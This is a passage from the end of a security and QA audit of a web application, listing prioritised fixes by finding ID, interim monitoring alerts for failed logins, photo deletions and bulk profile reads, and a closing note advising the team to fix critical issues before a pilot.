24. **QA-030** — promote phone uniqueness comment into a real Prisma migration
25. **QA-031, QA-032** — explicit `onDelete` policies + index on `Attachment.hash`
26. **QA-033, QA-034** — row caps on dedupe + export
27. **QA-035, QA-036, QA-037** — user management guards
28. **QA-038, QA-039** — handle deleted entities in approve replay
29. **QA-041** — write IP / user-agent on every AuditLog entry
30. **QA-046, QA-053, QA-054, QA-055** — strip health info, narrow CSP, add COOP/COEP, wrap Sentry

### Priority 3 — Cleanup & continuous improvement
31. Everything in §3 not above.
32. Add CI: `npm run build` + Playwright; require service-container Postgres for integration tests.
33. Replace synthetic-seed default password with environment-required value; assert non-prod.
34. Add `EXPORT` enum to `AuditAction`; remove dead `ExportJob` model or wire it.

### Monitoring to add immediately
- **Failed login rate alert** — until QA-006 is fixed, alert on >10 failed logins per minute per IP, manually.
- **Photo deletion alert** — until QA-003 is fixed, alert on every Attachment delete; ideally pause writes.
- **Bulk profile read alert** — until QA-001 is fixed, alert if a single user fetches >50 distinct `/customers/[id]` in 5 minutes.

---

## 11) Closing note

You asked for an adversarial audit. The findings reflect that posture. None of these are reasons to think the project is ill-conceived — the architecture, the schema design, the role taxonomy, the PRD discipline, and the build trajectory are all sound. The bugs are normal for a v1 dash that prioritized feature-completeness over a hostile-pen-test pass. Most fixes are surgical and small. With the 1-2 days of stop-ship work plus the 3-5 days of pre-pilot work, this app is genuinely ready for a 2-route pilot.

What it is **not** ready for today is real customer data, real users, and real consequence. Pause, fix the criticals, retest, and ship.

— Independent QA / Security audit, 2026-05-09
